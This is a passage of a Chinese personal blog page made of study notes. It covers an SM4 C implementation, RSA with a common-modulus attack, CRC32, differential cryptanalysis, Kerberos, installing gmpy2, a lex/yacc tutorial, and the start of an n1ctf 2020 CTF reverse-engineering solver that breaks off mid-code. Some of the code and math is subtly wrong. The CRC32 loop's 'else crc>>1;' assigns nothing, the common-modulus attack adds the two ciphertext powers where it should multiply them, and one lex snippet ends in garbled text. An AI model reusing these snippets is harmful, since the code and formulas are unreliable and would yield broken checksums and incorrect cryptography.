class="title">decrypt</span><span class="params">(<span class="keyword">uint32_t</span> c[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    crypt(c, rrk); <span class="comment">// rrk是rk的逆序</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initKey</span><span class="params">(<span class="keyword">uint32_t</span> mk[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> k[<span class="number">36</span>];</span><br><span class="line">    k[<span class="number">0</span>] = mk[<span class="number">0</span>] ^ fk[<span class="number">0</span>];</span><br><span class="line">    k[<span class="number">1</span>] = mk[<span class="number">1</span>] ^ fk[<span class="number">1</span>];</span><br><span class="line">    k[<span class="number">2</span>] = mk[<span class="number">2</span>] ^ fk[<span class="number">2</span>];</span><br><span class="line">    k[<span class="number">3</span>] = mk[<span class="number">3</span>] ^ fk[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> t;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; RK_SIZE; i++) &#123;</span><br><span class="line">        t = k[i + <span class="number">1</span>] ^ k[i + <span class="number">2</span>] ^ k[i + <span class="number">3</span>]^ck(i);</span><br><span class="line">        k[i + <span class="number">4</span>] = k[i] ^ Tp(t);</span><br><span class="line">        rk[i] = k[i + <span class="number">4</span>];</span><br><span class="line">        rrk[RK_SIZE - i<span class="number">-1</span>] = rk[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* name, <span class="keyword">uint32_t</span>* d, <span class="keyword">size_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;==============%s============\n&quot;</span>, name);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%08X,&quot;</span>, d[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n============================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> data[] = &#123; <span class="number">0x01</span>,<span class="number">0x23</span>,<span class="number">0x45</span>,<span class="number">0x67</span>,<span class="number">0x89</span>,<span class="number">0xab</span>,<span class="number">0xcd</span>,<span class="number">0xef</span>,<span class="number">0xfe</span>,<span class="number">0xdc</span>,<span class="number">0xba</span>,<span class="number">0x98</span>,<span class="number">0x76</span>,<span class="number">0x54</span>,<span class="number">0x32</span>,<span class="number">0x10</span> &#125;;</span><br><span class="line">    <span class="keyword">uint8_t</span> key[] = &#123; <span class="number">0x01</span>,<span class="number">0x23</span>,<span class="number">0x45</span>,<span class="number">0x67</span>,<span class="number">0x89</span>,<span class="number">0xab</span>,<span class="number">0xcd</span>,<span class="number">0xef</span>,<span class="number">0xfe</span>,<span class="number">0xdc</span>,<span class="number">0xba</span>,<span class="number">0x98</span>,<span class="number">0x76</span>,<span class="number">0x54</span>,<span class="number">0x32</span>,<span class="number">0x10</span> &#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> mk[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> p[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(p, data, <span class="number">16</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(mk, key, <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        mk[i] = R(mk[i]);</span><br><span class="line">        p[i] = R(p[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    initKey(mk);</span><br><span class="line">    printArray(<span class="string">&quot;plain text&quot;</span>, p, <span class="number">4</span>);</span><br><span class="line">    encrypt(p);</span><br><span class="line">    printArray(<span class="string">&quot;cipher&quot;</span>, p, <span class="number">4</span>);</span><br><span class="line">    decrypt(p);</span><br><span class="line">    printArray(<span class="string">&quot;plain text(after decrypt)&quot;</span>, p, <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        p[i] = R(p[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(data, p, <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="参考资料-1"><a href="#参考资料-1" class="headerlink" title="参考资料"></a>参考资料</h4><p>[1] SM4算法标准</p>
<h2 id="公钥加密算法"><a href="#公钥加密算法" class="headerlink" title="公钥加密算法"></a>公钥加密算法</h2><h3 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h3><blockquote>
<p>费马小定理</p>
<p>$p$是质数，$a$不是$p$的倍数，$a^{p-1}mod\ p\equiv1$</p>
</blockquote>
<p>那么对于数据$a$，加密后的数据为$c$，私钥为$e,p,q$，公钥为$d,n$</p>
<p>其中$n=pq$，$ed\equiv 1(\mod (p-1)(q-1))$</p>
<p>则加密</p>
<p>$$<br>c=a^{e}\mod n<br>$$</p>
<p>解密</p>
<p>$$<br>c^{d}\mod n\equiv (a^e)^d\mod n\equiv a^{ed}\mod n<br>$$</p>
<p>由于</p>
<p>$$<br>a^{ed}\equiv a^{1+t(p-1)(q-1)}\mod n=aa^{(p-1)(q-1)}\mod n<br>$$</p>
<p>又由于$n=pq,ab\mod n=(a\mod n)(b\mod n)\mod n$</p>
<p>得到</p>
<p>$$<br>a^{(p-1)(q-1)}\mod n<br>$$</p>
<p>从而</p>
<p>$$<br>(a^{p-1})^{q-1}\mod pq\equiv a^{p-1}\mod p\equiv 1<br>$$</p>
<p>从而解密出来为$a$</p>
<h4 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h4><blockquote>
<p>共模攻击</p>
</blockquote>
<p>$c_1=a^{e_1}\mod n,c_2=a^{e_2}\mod n,gcd(e1,e2)=1$</p>
<p>则有辗转相除法有$xe_1+ye_2=1$</p>
<p>则$c_1^{x}+c_2{y}=a^{xe_1+ye_2}=a$</p>
<h3 id="ElGamal"><a href="#ElGamal" class="headerlink" title="ElGamal"></a>ElGamal</h3><p>// TODO</p>
<h2 id="其它加密算法"><a href="#其它加密算法" class="headerlink" title="其它加密算法"></a>其它加密算法</h2><h3 id="CRC32"><a href="#CRC32" class="headerlink" title="CRC32"></a>CRC32</h3><p>用于校验数据</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">CRC</span><span class="params">(<span class="keyword">uint32_t</span> *v,<span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> crc32tab[<span class="number">256</span>],crc,dwcrc=<span class="number">0xFFFFFFFF</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)&#123;</span><br><span class="line">        crc=i;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">size_t</span> j=<span class="number">0</span>;j&lt;<span class="number">8</span>;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(crc&amp;<span class="number">1</span>)crc=(crc&gt;&gt;<span class="number">1</span>)^<span class="number">0xEDB88320</span>;</span><br><span class="line">            <span class="keyword">else</span> crc&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        crc32tab[i]=crc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        dwcrc=crc32tab[(dwcrc^v[i])&amp;<span class="number">0xFF</span>]^(dwcrc&gt;&gt;<span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    dwcrc=~dwcrc;</span><br><span class="line">    <span class="keyword">return</span> dwcrc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>CRC并不安全，只用于传输过程中完整性的校验</p>
<h3 id="base系列"><a href="#base系列" class="headerlink" title="base系列"></a>base系列</h3><p>base64，base56，base32，base16</p>
<p>找到base表</p>
<h2 id="差分密码分析"><a href="#差分密码分析" class="headerlink" title="差分密码分析"></a>差分密码分析</h2><p>攻击者选取一部分明文并获取相应密文，运用若干对有着常量差异的明文，计算其中的差异$\Delta x=f(x_1,x_2)$，其中$f$可以自定义，比如异或操作。</p>
<p>然后攻击者计算相应密文的差异，尝试找出差异分布的统计特征。明文差异和密文差异所组成的差异叫做差分，统计特征由所使用的S盒所决定。</p>
<p>对于S盒$S$，攻击者分析差分$(\Delta x,\Delta y),\Delta y=S(x\oplus \Delta x)\oplus S(x)$。攻击者希望某个密文差异出现的频率非常高，这样就能将加密和随机过程区分开来。</p>
<blockquote>
<p>最基本的差分密码分析密钥破解形式中，攻击者首先获取大量明文对的密文，并假设差分在至少<em>r</em> − 1轮后有效，<em>r</em>即加密算法的总轮数。攻击者在倒数第二轮与最后一轮之间差异固定的假设下，去推测可能的轮密钥。如果轮密钥比较短，那么只需举可能的轮密钥，直到最后一轮运算结果和差异的<em>密文对</em>一致即可。当一个轮密钥看起来明显比其他密钥常出现时，其会被假设是正确的轮密钥</p>
</blockquote>
<p>还不是很懂，回头看英文版似乎有个简单的例子。</p>
<p>参考资料</p>
<p>[1] <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%B7%AE%E5%88%86%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90">差分密码分析–wikipedia</a></p>
<h2 id="Kerberos认证流程"><a href="#Kerberos认证流程" class="headerlink" title="Kerberos认证流程"></a>Kerberos认证流程</h2><p>Kerberos用于服务器认证用户身份</p>
<p>Kerberos保存有所有人的密钥</p>
<p>过程</p>
<ol>
<li>客户从Kerberos认证服务器请求一张票据，该票据用用户的密钥加密之后发送给用户。这个票据是TGS(票据许可服务)</li>
<li>客再从TGS请求一张票据，TGS将票据返回给用户</li>
<li>用户将此票据呈现给服务器，如果用户身份没问题，服务器便会提供服务</li>
</ol>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-note/develop/python_gmpy" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/10/21/note/develop/python_gmpy/" class="article-date">
  	<time datetime="2020-10-21T08:20:24.000Z" itemprop="datePublished">2020-10-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/21/note/develop/python_gmpy/">
        windows下python安装gmpy2
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="gmp"><a href="#gmp" class="headerlink" title="gmp"></a>gmp</h2><p>gmp是gnu的大整数运算库，gmpy2应用于python平台</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ol>
<li><p>安装python</p>
</li>
<li><p>安装wheel</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install wheel</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装gmpy对应的wheel</p>
<p>在<a target="_blank" rel="noopener" href="https://www.lfd.uci.edu/~gohlke/pythonlibs/#gmpy">这个网站</a>找到你的python版本对应的gmpy2 wheel，比如说我是python3.8版本就选择<code>gmpy2-2.0.8-c</code><strong>p38</strong><code>-cp38-win_amd64.whl</code>下载之后安装。</p>
<p>python版本直接在命令行内运行</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -<span class="literal">-version</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>安装gmpy2</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install gmpy2</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python</span><br></pre></td></tr></table></figure>

<p>输入</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br></pre></td></tr></table></figure>

<p>不报错即可</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43302174/article/details/102933164">基于python3在windows下安装gmpy2</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-note/compiler/lex_and_yacc" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/10/21/note/compiler/lex_and_yacc/" class="article-date">
  	<time datetime="2020-10-21T07:55:31.000Z" itemprop="datePublished">2020-10-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/21/note/compiler/lex_and_yacc/">
        lex，yacc学习笔记
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="lex和yacc是什么"><a href="#lex和yacc是什么" class="headerlink" title="lex和yacc是什么"></a>lex和yacc是什么</h2><p>lex是一个生成词法分析器的程序，flex是其开源版本。</p>
<p>所谓生成词法分析器，就是按照你的意愿，遇到某个词法时执行某个动作</p>
<p>yacc时生成编译器的编译器，生成的主要是编译器的词法解析器。配合yacc使用，当解析到某种语法时执行一定的动作。</p>
<p>lex的开源版本为flex，yacc对应gnu的bison</p>
<p>kali安装</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install flex bison</span><br></pre></td></tr></table></figure>

<h2 id="lex使用简单介绍"><a href="#lex使用简单介绍" class="headerlink" title="lex使用简单介绍"></a>lex使用简单介绍</h2><p>lex文件格式为*.l，例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">%&#125;</span><br><span class="line">%%</span><br><span class="line"><span class="function">stop <span class="title">printf</span><span class="params">(<span class="string">&quot;Stop command received\n&quot;</span>)</span></span>;</span><br><span class="line"><span class="function">start <span class="title">printf</span><span class="params">(<span class="string">&quot;Start command received\n&quot;</span>)</span></span>;</span><br><span class="line">%%</span><br></pre></td></tr></table></figure>

<p>保存，然后执行</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lex 文件名.l</span><br></pre></td></tr></table></figure>

<p>会在同目录下生成lex.yy.c</p>
<p>执行命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cc lex.yy.c -ll -o a # -ll代表使用lex库，提供了main函数，-o a代表输出到</span><br></pre></td></tr></table></figure>

<p>运行a程序，发现输入stop和start时会打印对应的东西，其他情况回显</p>
<p>lex使用正则表达式</p>
<h2 id="yacc使用"><a href="#yacc使用" class="headerlink" title="yacc使用"></a>yacc使用</h2><p>yacc语法分析器解析一个标识流符，这里就需要lex配合了。因为yacc并不知道输入流中的字符是什么东西。</p>
<p>假定有一个温度计，使用如下语言控制它</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">heat on</span><br><span class="line">Heater on!</span><br><span class="line">heat off</span><br><span class="line">Header off!</span><br><span class="line">target temperature set!</span><br></pre></td></tr></table></figure>

<p>lex的tokenizer为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;y.tab.h&quot;</span></span></span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line">[<span class="number">0</span><span class="number">-9</span>]+ <span class="keyword">return</span> NUMBER;</span><br><span class="line">heat <span class="keyword">return</span> TOKHEAT;</span><br><span class="line">on|off <span class="keyword">return</span> STATE;</span><br><span class="line">target <span class="keyword">return</span> TOKTARGET;</span><br><span class="line">temperature <span class="keyword">return</span> TOKTEMPERATURE;</span><br><span class="line">\n <span class="comment">/* ignore end of line */</span>;</span><br><span class="line">[ \t]+ <span class="comment">/* ignore whitespace */</span></span><br><span class="line">%%ure <span class="built_in">set</span>\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">&#125;;</span></span><br></pre></td></tr></table></figure>

<p>y.tab.h中定义了NUMBER，TOKHEAT这些常量，这个文件由yacc根据我们编写的语法规则生成</p>
<p>yacc的文件后缀名为*.y</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//在lex.yy.c里定义，会被yyparse()调用。在此声明消除编译和链接错误。</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">yylex</span><span class="params">(<span class="keyword">void</span>)</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 在此声明，消除yacc生成代码时的告警</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">yyparse</span><span class="params">(<span class="keyword">void</span>)</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yywrap</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 该函数在y.tab.c里会被调用，需要在此定义</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">yyerror</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[error] %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	yyparse();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">%token NUMBER TOKHEAT STATE TOKTARGET TOKTEMPERATURE</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line">commands: <span class="comment">/* empty */</span></span><br><span class="line">| commands command</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line">command: heat_switch | target_set ;</span><br><span class="line"></span><br><span class="line">heat_switch:</span><br><span class="line">TOKHEAT STATE</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\tHeat turned on or off\n&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">target_set:</span><br><span class="line">TOKTARGET TOKTEMPERATURE NUMBER</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\tTemperature set\n&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line">%%</span><br></pre></td></tr></table></figure>

<p>编译运行这个程序</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lex a.l</span><br><span class="line">yacc -d a.y # 增加-d选项以生成y.tab.h</span><br><span class="line">cc lex.yy.c y.tab.c -o a</span><br></pre></td></tr></table></figure>

<p>现在为止，已经具备一个编译器的基本单元。但是考虑这个问题：lex识别了一个标识符，但是C语言中不同的标识符有不同的含义，所以还需要为它生成一个ID，为语义分析做准备。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;y.tab.h&quot;</span></span></span><br><span class="line">%&#125;</span><br><span class="line"><span class="comment">// yytext指识别到的语句，yyval用来向yacc传递值</span></span><br><span class="line">%%</span><br><span class="line">[<span class="number">0</span><span class="number">-9</span>]+ yylval = atoi(yytext); <span class="keyword">return</span> NUMBER;</span><br><span class="line">heat <span class="keyword">return</span> TOKHEAT;</span><br><span class="line">on|off yylval = !<span class="built_in">strcmp</span>(yytext, <span class="string">&quot;on&quot;</span>); <span class="keyword">return</span> STATE;</span><br><span class="line">target <span class="keyword">return</span> TOKTARGET;</span><br><span class="line">temperature <span class="keyword">return</span> TOKTEMPERATURE;</span><br><span class="line">\n <span class="comment">/* ignore end of line */</span></span><br><span class="line">[ \t]+ <span class="comment">/* ignore whitespace */</span></span><br><span class="line">%%</span><br></pre></td></tr></table></figure>

<p>yacc规则中也需要做出一些更改</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">target_set:</span><br><span class="line">TOKTARGET TOKTEMPERATURE NUMBER</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\tTemperature set to %d\n&quot;</span>, $<span class="number">3</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// $3表示这个语法的第三个单元中的参数</span></span><br><span class="line">heat_switch:</span><br><span class="line">TOKHEAT STATE</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ($<span class="number">2</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\tHeat turned on\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\tHeat turned off\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// $2表示这个语法中第二个单元的参数</span></span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/143867739">Lex与YACC详解 - Deepliu的文章 - 知乎</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-writeup/n1ctf2020/wp" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/10/20/writeup/n1ctf2020/wp/" class="article-date">
  	<time datetime="2020-10-20T05:59:47.000Z" itemprop="datePublished">2020-10-20</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/20/writeup/n1ctf2020/wp/">
        n1ctf 2020 逆向wp
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="oflo"><a href="#oflo" class="headerlink" title="oflo"></a>oflo</h2><p>// TODO</p>
<h2 id="easyapk"><a href="#easyapk" class="headerlink" title="easyapk"></a>easyapk</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random,string</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;n1ctf&#123;17b87f9aae8933ef&#x27;</span></span><br><span class="line">print(s+<span class="string">&#x27;a&#x27;</span>*(<span class="number">38</span>-len(s))+<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">print(len(s)<span class="number">-6</span>)</span><br><span class="line">a = <span class="string">&#x27;jZe3yJG3zJLHywu4otmZzwy&#x27;</span></span><br><span class="line">tab = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+-&#x27;</span></span><br><span class="line">rtab = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">d = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(tab)):</span><br><span class="line">    d[tab[i]] = rtab[i]</span><br><span class="line">ra = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> 